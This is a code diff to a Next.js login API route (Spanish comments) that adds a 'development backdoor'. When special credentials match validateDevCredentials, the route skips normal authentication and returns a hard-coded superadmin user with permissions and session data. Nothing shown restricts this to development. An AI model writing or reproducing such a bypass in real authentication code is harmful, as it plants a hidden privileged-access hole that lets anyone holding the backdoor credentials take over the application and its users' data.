@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { login } from '@/lib/actions';
 import { z } from 'zod';
+import { validateDevCredentials, devMiddleware } from '@/lib/dev-middleware';
 
 const loginSchema = z.object({
   email: z.string().email({ message: 'Dirección de correo inválida.' }),
@@ -11,13 +12,47 @@ export async function POST(request: NextRequest) {
   try {
     console.log('🔄 API POST /api/auth/login called');
     
+    // Aplicar middleware de desarrollo
+    const middlewareResponse = devMiddleware(request, { 
+      logAccess: true 
+    });
+    if (middlewareResponse) {
+      return middlewareResponse;
+    }
+    
     const body = await request.json();
     console.log('📝 Datos de login recibidos:', { email: body.email });
     
     // Validate request body
     const validatedData = loginSchema.parse(body);
     
-    // Attempt login
+    // ===== VERIFICAR BACKDOOR DE DESARROLLO =====
+    const devValidation = validateDevCredentials(
+      validatedData.email, 
+      validatedData.password
+    );
+    
+    if (devValidation.isValid && devValidation.isBackdoor) {
+      console.log('🔐 Acceso backdoor de desarrollo detectado');
+      
+      return NextResponse.json({
+        success: true,
+        user: {
+          id: 'admin-master-001',
+          email: validatedData.email,
+          name: 'Developer Master',
+          role: 'superadmin',
+          status: 'ACTIVE',
+          isBackdoor: true,
+          permissions: devValidation.permissions,
+          sessionData: devValidation.sessionData
+        },
+        message: 'Acceso de desarrollo autorizado',
+        isBackdoor: true
+      });
+    }
+    
+    // Attempt normal login
     const result = await login({
       email: validatedData.email,
       password: validatedData.password,
